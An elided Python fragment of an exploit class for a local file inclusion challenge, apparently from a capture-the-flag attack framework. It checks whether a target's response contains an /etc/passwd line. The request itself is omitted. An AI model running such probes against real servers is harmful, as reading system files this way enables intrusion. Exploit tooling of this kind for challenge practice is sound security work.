...
class ChallengeThreeLFI(Exploit):
	def __init__(self, ip_address) -> None:
		super().__init__(ip_address=ip_address)

	def run_custom_command(self, command):
		logger.info("ChallengeThreeLFI does not support running custom commands.")
		return False
	...
	def test_if_vulnerable(self):
		...
		"""
		try:
			logger.info("Testing if the target is vulnerable to ChallengeThreeLFI...")
			...
			if "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" in server_response_text:
				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeThreeLFI!{COLOR_END}")
				return True
			return False
		except PatchedException:
			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeThreeLFI.{COLOR_END}")
			return False
